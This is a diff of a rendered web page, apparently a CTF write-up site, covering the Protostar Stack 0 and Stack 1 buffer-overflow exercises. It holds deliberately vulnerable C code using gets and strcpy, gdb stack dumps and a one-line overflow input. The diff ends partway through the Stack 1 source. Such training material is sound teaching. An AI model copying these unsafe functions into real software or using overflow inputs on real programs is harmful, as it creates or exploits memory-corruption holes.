@@ -2179,6 +2179,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/tetctftoken/" class="md-nav__link">
+        TetCTFToken
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -2838,270 +2852,270 @@
 <blockquote>
 <p>memory can be accessed outside of its allocated region</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
 <span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">modified</span><span class="p">;</span><span class="w"> </span><span class="c1">// volatile tells the compiler not to cache the value of `modified`</span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-<span class="w">  </span><span class="n">modified</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">modified</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 <span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"> </span><span class="c1">// Never use gets().</span>
 <span class="w">  </span><span class="c1">// Because it&#39;s impossible to tell without knowing the data in advance</span>
 <span class="w">  </span><span class="c1">// how many characters gets() will read, and gets() will continue to</span>
 <span class="w">  </span><span class="c1">// store characters past the end of the buffer</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">modified</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">modified</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 <details class="note">
 <summary>Dump of assembler code for function main</summary>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
-<span class="o">(</span>gdb<span class="o">)</span> disassemble main
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-0x080483f4 &lt;main+0&gt;:    push   ebp
-0x080483f5 &lt;main+1&gt;:    mov    ebp,esp
-0x080483f7 &lt;main+3&gt;:    and    esp,0xfffffff0
-0x080483fa &lt;main+6&gt;:    sub    esp,0x60
-0x080483fd &lt;main+9&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x5c<span class="o">]</span>,0x0 <span class="c1"># modified = 0</span>
-0x08048405 &lt;main+17&gt;:   lea    eax,<span class="o">[</span>esp+0x1c<span class="o">]</span>
-0x08048409 &lt;main+21&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax  <span class="c1"># passing the address of buffer to gets()</span>
-0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt;
-0x08048411 &lt;main+29&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x5c<span class="o">]</span> <span class="c1"># starting to check the value of modified</span>
-0x08048415 &lt;main+33&gt;:   <span class="nb">test</span>   eax,eax
-0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt;
-0x08048419 &lt;main+37&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048500
-0x08048420 &lt;main+44&gt;:   call   0x804832c &lt;puts@plt&gt;
-0x08048425 &lt;main+49&gt;:   jmp    0x8048433 &lt;main+63&gt;
-0x08048427 &lt;main+51&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048529
-0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt;
-0x08048433 &lt;main+63&gt;:   leave  
-0x08048434 &lt;main+64&gt;:   ret    
-End of assembler dump.
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>disassembly-flavor<span class="w"> </span>intel
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>main
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>main:
+0x080483f4<span class="w"> </span>&lt;main+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x080483f5<span class="w"> </span>&lt;main+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x080483f7<span class="w"> </span>&lt;main+3&gt;:<span class="w">    </span>and<span class="w">    </span>esp,0xfffffff0
+0x080483fa<span class="w"> </span>&lt;main+6&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x60
+0x080483fd<span class="w"> </span>&lt;main+9&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x5c<span class="o">]</span>,0x0<span class="w"> </span><span class="c1"># modified = 0</span>
+0x08048405<span class="w"> </span>&lt;main+17&gt;:<span class="w">   </span>lea<span class="w">    </span>eax,<span class="o">[</span>esp+0x1c<span class="o">]</span>
+0x08048409<span class="w"> </span>&lt;main+21&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax<span class="w">  </span><span class="c1"># passing the address of buffer to gets()</span>
+0x0804840c<span class="w"> </span>&lt;main+24&gt;:<span class="w">   </span>call<span class="w">   </span>0x804830c<span class="w"> </span>&lt;gets@plt&gt;
+0x08048411<span class="w"> </span>&lt;main+29&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x5c<span class="o">]</span><span class="w"> </span><span class="c1"># starting to check the value of modified</span>
+0x08048415<span class="w"> </span>&lt;main+33&gt;:<span class="w">   </span><span class="nb">test</span><span class="w">   </span>eax,eax
+0x08048417<span class="w"> </span>&lt;main+35&gt;:<span class="w">   </span>je<span class="w">     </span>0x8048427<span class="w"> </span>&lt;main+51&gt;
+0x08048419<span class="w"> </span>&lt;main+37&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x8048500
+0x08048420<span class="w"> </span>&lt;main+44&gt;:<span class="w">   </span>call<span class="w">   </span>0x804832c<span class="w"> </span>&lt;puts@plt&gt;
+0x08048425<span class="w"> </span>&lt;main+49&gt;:<span class="w">   </span>jmp<span class="w">    </span>0x8048433<span class="w"> </span>&lt;main+63&gt;
+0x08048427<span class="w"> </span>&lt;main+51&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x8048529
+0x0804842e<span class="w"> </span>&lt;main+58&gt;:<span class="w">   </span>call<span class="w">   </span>0x804832c<span class="w"> </span>&lt;puts@plt&gt;
+0x08048433<span class="w"> </span>&lt;main+63&gt;:<span class="w">   </span>leave<span class="w">  </span>
+0x08048434<span class="w"> </span>&lt;main+64&gt;:<span class="w">   </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
 </code></pre></div>
 </details>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x0804840c
-Breakpoint <span class="m">2</span> at 0x804840c: file stack0/stack0.c, line <span class="m">11</span>.
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x08048411
-Breakpoint <span class="m">3</span> at 0x8048411: file stack0/stack0.c, line <span class="m">13</span>.
-<span class="o">(</span>gdb<span class="o">)</span> define hook-stop  <span class="c1"># define a hook, some commands will be executed when stops</span>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x0804840c
+Breakpoint<span class="w"> </span><span class="m">2</span><span class="w"> </span>at<span class="w"> </span>0x804840c:<span class="w"> </span>file<span class="w"> </span>stack0/stack0.c,<span class="w"> </span>line<span class="w"> </span><span class="m">11</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x08048411
+Breakpoint<span class="w"> </span><span class="m">3</span><span class="w"> </span>at<span class="w"> </span>0x8048411:<span class="w"> </span>file<span class="w"> </span>stack0/stack0.c,<span class="w"> </span>line<span class="w"> </span><span class="m">13</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>define<span class="w"> </span>hook-stop<span class="w">  </span><span class="c1"># define a hook, some commands will be executed when stops</span>
 <span class="c1"># Note: some unimportant output parts are omitted below</span>
-Type commands <span class="k">for</span> definition of <span class="s2">&quot;hook-stop&quot;</span>.
-End with a line saying just <span class="s2">&quot;end&quot;</span>.
-&gt;info registers
-&gt;x/24wx <span class="nv">$esp</span>
-&gt;x/2i <span class="nv">$eip</span>
+Type<span class="w"> </span>commands<span class="w"> </span><span class="k">for</span><span class="w"> </span>definition<span class="w"> </span>of<span class="w"> </span><span class="s2">&quot;hook-stop&quot;</span>.
+End<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>line<span class="w"> </span>saying<span class="w"> </span>just<span class="w"> </span><span class="s2">&quot;end&quot;</span>.
+&gt;info<span class="w"> </span>registers
+&gt;x/24wx<span class="w"> </span><span class="nv">$esp</span>
+&gt;x/2i<span class="w"> </span><span class="nv">$eip</span>
 &gt;end
-<span class="o">(</span>gdb<span class="o">)</span> r
-Starting program: /opt/protostar/bin/stack0
-<span class="o">(</span>gdb<span class="o">)</span> c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/stack0
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
-THISISTHEINPUT  <span class="c1"># 544849534953544845494e505554</span>
-eax            0xbffff65c   -1073744292
-ecx            0xbffff65c   -1073744292
-edx            0xb7fd9334   -1208118476
-ebx            0xb7fd7ff4   -1208123404
-esp            0xbffff640   0xbffff640
-ebp            0xbffff6a8   0xbffff6a8
-esi            0x0  <span class="m">0</span>
-edi            0x0  <span class="m">0</span>
-eip            0x8048411    0x8048411 &lt;main+29&gt;
-eflags         0x200246 <span class="o">[</span> PF ZF IF ID <span class="o">]</span>
-cs             0x73 <span class="m">115</span>
-ss             0x7b <span class="m">123</span>
-ds             0x7b <span class="m">123</span>
-es             0x7b <span class="m">123</span>
-fs             0x0  <span class="m">0</span>
-gs             0x33 <span class="m">51</span>
-0xbffff640: 0xbffff65c  0x00000001  0xb7fff8f8  0xb7f0186e
-0xbffff650: 0xb7fd7ff4  0xb7ec6165  0xbffff668  0x53494854  <span class="c1"># start from here</span>
-0xbffff660: 0x48545349  0x504e4945  0xbf005455  0x080482e8
-0xbffff670: 0xb7ff1040  0x08049620  0xbffff6a8  0x08048469
-0xbffff680: 0xb7fd8304  0xb7fd7ff4  0x08048450  0xbffff6a8
-0xbffff690: 0xb7ec6365  0xb7ff1040  0x0804845b  0x00000000  <span class="c1"># need at least 16 bytes + 1 bit to overwrite the value of `modified`</span>
-0x8048411 &lt;main+29&gt;:    mov    eax,DWORD PTR <span class="o">[</span>esp+0x5c<span class="o">]</span>
-0x8048415 &lt;main+33&gt;:    <span class="nb">test</span>   eax,eax
+THISISTHEINPUT<span class="w">  </span><span class="c1"># 544849534953544845494e505554</span>
+eax<span class="w">            </span>0xbffff65c<span class="w">   </span>-1073744292
+ecx<span class="w">            </span>0xbffff65c<span class="w">   </span>-1073744292
+edx<span class="w">            </span>0xb7fd9334<span class="w">   </span>-1208118476
+ebx<span class="w">            </span>0xb7fd7ff4<span class="w">   </span>-1208123404
+esp<span class="w">            </span>0xbffff640<span class="w">   </span>0xbffff640
+ebp<span class="w">            </span>0xbffff6a8<span class="w">   </span>0xbffff6a8
+esi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
+edi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
+eip<span class="w">            </span>0x8048411<span class="w">    </span>0x8048411<span class="w"> </span>&lt;main+29&gt;
+eflags<span class="w">         </span>0x200246<span class="w"> </span><span class="o">[</span><span class="w"> </span>PF<span class="w"> </span>ZF<span class="w"> </span>IF<span class="w"> </span>ID<span class="w"> </span><span class="o">]</span>
+cs<span class="w">             </span>0x73<span class="w"> </span><span class="m">115</span>
+ss<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+ds<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+es<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+fs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
+gs<span class="w">             </span>0x33<span class="w"> </span><span class="m">51</span>
+0xbffff640:<span class="w"> </span>0xbffff65c<span class="w">  </span>0x00000001<span class="w">  </span>0xb7fff8f8<span class="w">  </span>0xb7f0186e
+0xbffff650:<span class="w"> </span>0xb7fd7ff4<span class="w">  </span>0xb7ec6165<span class="w">  </span>0xbffff668<span class="w">  </span>0x53494854<span class="w">  </span><span class="c1"># start from here</span>
+0xbffff660:<span class="w"> </span>0x48545349<span class="w">  </span>0x504e4945<span class="w">  </span>0xbf005455<span class="w">  </span>0x080482e8
+0xbffff670:<span class="w"> </span>0xb7ff1040<span class="w">  </span>0x08049620<span class="w">  </span>0xbffff6a8<span class="w">  </span>0x08048469
+0xbffff680:<span class="w"> </span>0xb7fd8304<span class="w">  </span>0xb7fd7ff4<span class="w">  </span>0x08048450<span class="w">  </span>0xbffff6a8
+0xbffff690:<span class="w"> </span>0xb7ec6365<span class="w">  </span>0xb7ff1040<span class="w">  </span>0x0804845b<span class="w">  </span>0x00000000<span class="w">  </span><span class="c1"># need at least 16 bytes + 1 bit to overwrite the value of `modified`</span>
+0x8048411<span class="w"> </span>&lt;main+29&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x5c<span class="o">]</span>
+0x8048415<span class="w"> </span>&lt;main+33&gt;:<span class="w">    </span><span class="nb">test</span><span class="w">   </span>eax,eax
 
-Breakpoint <span class="m">3</span>, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at stack0/stack0.c:13
-<span class="m">13</span>  <span class="k">in</span> stack0/stack0.c
-<span class="o">(</span>gdb<span class="o">)</span> x/wx <span class="nv">$esp</span>+0x5c    <span class="c1"># check the value of `modified`</span>
-0xbffff69c: 0x00000000
+Breakpoint<span class="w"> </span><span class="m">3</span>,<span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>stack0/stack0.c:13
+<span class="m">13</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>stack0/stack0.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/wx<span class="w"> </span><span class="nv">$esp</span>+0x5c<span class="w">    </span><span class="c1"># check the value of `modified`</span>
+0xbffff69c:<span class="w"> </span>0x00000000
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r
-The program being debugged has been started already.
-Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r
+The<span class="w"> </span>program<span class="w"> </span>being<span class="w"> </span>debugged<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>started<span class="w"> </span>already.
+Start<span class="w"> </span>it<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>beginning?<span class="w"> </span><span class="o">(</span>y<span class="w"> </span>or<span class="w"> </span>n<span class="o">)</span><span class="w"> </span>y
 
-Starting program: /opt/protostar/bin/stack0
-<span class="o">(</span>gdb<span class="o">)</span> c
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/stack0
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
 123456789012345678901234567890123456789012345678901234567890ABCDE
-eax            0xbffff65c   -1073744292
-ecx            0xbffff65c   -1073744292
-edx            0xb7fd9334   -1208118476
-ebx            0xb7fd7ff4   -1208123404
-esp            0xbffff640   0xbffff640
-ebp            0xbffff6a8   0xbffff6a8
-esi            0x0  <span class="m">0</span>
-edi            0x0  <span class="m">0</span>
-eip            0x8048411    0x8048411 &lt;main+29&gt;
-eflags         0x200246 <span class="o">[</span> PF ZF IF ID <span class="o">]</span>
-cs             0x73 <span class="m">115</span>
-ss             0x7b <span class="m">123</span>
-ds             0x7b <span class="m">123</span>
-es             0x7b <span class="m">123</span>
-fs             0x0  <span class="m">0</span>
-gs             0x33 <span class="m">51</span>
-0xbffff640: 0xbffff65c  0x00000001  0xb7fff8f8  0xb7f0186e
-0xbffff650: 0xb7fd7ff4  0xb7ec6165  0xbffff668  0x34333231
-0xbffff660: 0x38373635  0x32313039  0x36353433  0x30393837
-0xbffff670: 0x34333231  0x38373635  0x32313039  0x36353433
-0xbffff680: 0x30393837  0x34333231  0x38373635  0x32313039
-0xbffff690: 0x36353433  0x30393837  0x44434241  0x00000045
-0x8048411 &lt;main+29&gt;:    mov    eax,DWORD PTR <span class="o">[</span>esp+0x5c<span class="o">]</span>
-0x8048415 &lt;main+33&gt;:    <span class="nb">test</span>   eax,eax
+eax<span class="w">            </span>0xbffff65c<span class="w">   </span>-1073744292
+ecx<span class="w">            </span>0xbffff65c<span class="w">   </span>-1073744292
+edx<span class="w">            </span>0xb7fd9334<span class="w">   </span>-1208118476
+ebx<span class="w">            </span>0xb7fd7ff4<span class="w">   </span>-1208123404
+esp<span class="w">            </span>0xbffff640<span class="w">   </span>0xbffff640
+ebp<span class="w">            </span>0xbffff6a8<span class="w">   </span>0xbffff6a8
+esi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
+edi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
+eip<span class="w">            </span>0x8048411<span class="w">    </span>0x8048411<span class="w"> </span>&lt;main+29&gt;
+eflags<span class="w">         </span>0x200246<span class="w"> </span><span class="o">[</span><span class="w"> </span>PF<span class="w"> </span>ZF<span class="w"> </span>IF<span class="w"> </span>ID<span class="w"> </span><span class="o">]</span>
+cs<span class="w">             </span>0x73<span class="w"> </span><span class="m">115</span>
+ss<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+ds<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+es<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+fs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
+gs<span class="w">             </span>0x33<span class="w"> </span><span class="m">51</span>
+0xbffff640:<span class="w"> </span>0xbffff65c<span class="w">  </span>0x00000001<span class="w">  </span>0xb7fff8f8<span class="w">  </span>0xb7f0186e
+0xbffff650:<span class="w"> </span>0xb7fd7ff4<span class="w">  </span>0xb7ec6165<span class="w">  </span>0xbffff668<span class="w">  </span>0x34333231
+0xbffff660:<span class="w"> </span>0x38373635<span class="w">  </span>0x32313039<span class="w">  </span>0x36353433<span class="w">  </span>0x30393837
+0xbffff670:<span class="w"> </span>0x34333231<span class="w">  </span>0x38373635<span class="w">  </span>0x32313039<span class="w">  </span>0x36353433
+0xbffff680:<span class="w"> </span>0x30393837<span class="w">  </span>0x34333231<span class="w">  </span>0x38373635<span class="w">  </span>0x32313039
+0xbffff690:<span class="w"> </span>0x36353433<span class="w">  </span>0x30393837<span class="w">  </span>0x44434241<span class="w">  </span>0x00000045
+0x8048411<span class="w"> </span>&lt;main+29&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x5c<span class="o">]</span>
+0x8048415<span class="w"> </span>&lt;main+33&gt;:<span class="w">    </span><span class="nb">test</span><span class="w">   </span>eax,eax
 
-Breakpoint <span class="m">3</span>, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at stack0/stack0.c:13
-<span class="m">13</span>  <span class="k">in</span> stack0/stack0.c
-<span class="o">(</span>gdb<span class="o">)</span> x/wx <span class="nv">$esp</span>+0x5c
-0xbffff69c: 0x00000045
-<span class="o">(</span>gdb<span class="o">)</span> c
+Breakpoint<span class="w"> </span><span class="m">3</span>,<span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>stack0/stack0.c:13
+<span class="m">13</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>stack0/stack0.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/wx<span class="w"> </span><span class="nv">$esp</span>+0x5c
+0xbffff69c:<span class="w"> </span>0x00000045
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
-you have changed the <span class="s1">&#39;modified&#39;</span> variable
+you<span class="w"> </span>have<span class="w"> </span>changed<span class="w"> </span>the<span class="w"> </span><span class="s1">&#39;modified&#39;</span><span class="w"> </span>variable
 </code></pre></div>
 <h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ python -c <span class="s1">&#39;print(&quot;A&quot; * 65)&#39;</span> <span class="p">|</span> ./stack0
-you have changed the <span class="s1">&#39;modified&#39;</span> variable
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;A&quot; * 65)&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./stack0
+you<span class="w"> </span>have<span class="w"> </span>changed<span class="w"> </span>the<span class="w"> </span><span class="s1">&#39;modified&#39;</span><span class="w"> </span>variable
 </code></pre></div>
 <h2 id="stack-1">Stack 1<a class="headerlink" href="#stack-1" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>Protostar is little endian</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">modified</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">modified</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;please specify an argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;please specify an argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
 
-<span class="w">  </span><span class="n">modified</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
+<span class="w">  </span><span class="n">modified</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 
 <span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">modified</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x61626364</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// &#39;dcba&#39; in little endian</span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">modified</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
